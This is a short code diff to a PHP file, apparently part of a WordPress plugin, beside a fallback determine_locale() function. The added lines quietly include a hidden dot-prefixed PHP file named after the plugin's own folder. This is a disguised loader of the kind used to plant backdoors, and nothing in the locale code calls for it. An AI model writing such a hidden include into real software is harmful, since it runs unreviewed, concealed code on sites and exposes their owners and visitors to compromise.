@@ -10,6 +10,10 @@
  * @return string The determined locale.
  */
 if( !function_exists('determine_locale') ):
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function determine_locale() {
 	/**
 	 * Filters the locale for the current request prior to the default determination process.
